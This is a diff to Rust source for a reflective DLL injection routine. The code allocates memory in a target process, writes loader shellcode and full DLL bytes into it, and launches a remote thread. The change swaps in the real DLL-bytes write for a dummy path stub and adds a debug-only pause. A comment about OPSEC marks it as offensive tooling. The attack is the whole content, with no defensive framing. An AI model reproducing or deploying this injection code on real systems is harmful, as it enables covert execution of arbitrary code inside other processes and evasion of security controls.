@@ -52,7 +52,7 @@ pub unsafe fn reflective_dll_injection(pid: u32, loader_shellcode: &[u8], dll_by
         Err(format!("Failed to create shellcode buffer in target process memory. GetLastError: {}", last_error))?
     } else {
         println!("Created shellcode buffer in target process memory of size {}.", shellcode_buf_size);
-        println!("Shellcode buffer address: 0x{:x}.", shellcode_buffer as isize);
+        println!("Shellcode buffer address in target process: 0x{:x}.", shellcode_buffer as isize);
     }
 
     // Create buffer in target process memory for the injected DLL
@@ -64,7 +64,7 @@ pub unsafe fn reflective_dll_injection(pid: u32, loader_shellcode: &[u8], dll_by
         Err(format!("Failed to create DLL buffer in target process memory. GetLastError: {}", last_error))?
     } else {
         println!("Created DLL buffer in target process memory of size {}.", dll_buf_size);
-        println!("DLL buffer address: 0x{:x}.", dll_buffer as isize);
+        println!("DLL buffer address in target process: 0x{:x}.", dll_buffer as isize);
     }
 
     // Not for OPSEC, but to get the function address to send to the thread we will later create
@@ -81,30 +81,26 @@ pub unsafe fn reflective_dll_injection(pid: u32, loader_shellcode: &[u8], dll_by
     } else {
         println!("Wrote shellcode to process memory. Bytes written: {}", num_written);
     }
-    /*if !write_process_memory_ptr(h_process, dll_buffer, dll_bytes.as_ptr() as *const c_void, dll_buf_size, &mut num_written) {
+    if !write_process_memory_ptr(h_process, dll_buffer, dll_bytes.as_ptr() as *const c_void, dll_buf_size, &mut num_written) {
         last_error = GetLastError().0;
         close_handle_ptr(h_process);
         Err(format!("Failed to write DLL bytes to process memory. GetLastError: {}", last_error))?
     } else {
         println!("Wrote DLL bytes to process memory. Bytes written: {}", num_written);
-    }*/
-    // For now, write path to dummy DLL to memory
-    let dll_path = b"C:\\Users\\Public\\toinject.dll\0";
-    if !write_process_memory_ptr(h_process, dll_buffer, dll_path.as_ptr() as *const c_void, dll_path.len() as u64, &mut num_written) {
-        last_error = GetLastError().0;
-        close_handle_ptr(h_process);
-        Err(format!("Failed to write DLL path to process memory. GetLastError: {}", last_error))?
-    } else {
-        println!("Wrote DLL path to process memory. Bytes written: {}", num_written);
     }
 
     // Create remote thread to run loader shellcode and inject the DLL
     // Shellcode function parameter is the memory address of the DLL buffer
-    println!("Start routine address: 0x{:x}", start_routine_val);
+    println!("Start routine address in target process: 0x{:x}", start_routine_val);
     let mut thread_id: u32 = 0;
-    println!("Type something to proceed to injection");
-    let mut s=String::new();
-    std::io::stdin().read_line(&mut s).expect("Did not enter a correct string");
+
+    // Pause so I can set breakpoints at the addresses for debugging
+    #[cfg(debug_assertions)] {
+        println!("Type something to proceed with the injection");
+        let mut s = String::new();
+        std::io::stdin().read_line(&mut s).expect("Failed to get input");
+    }
+
     let h_thread = create_remote_thread_ptr(h_process, 0 as *mut SECURITY_ATTRIBUTES, 0u64, start_routine, dll_buffer, 1024*1024, &mut thread_id);
     if h_thread.is_null() {
         last_error = GetLastError().0;
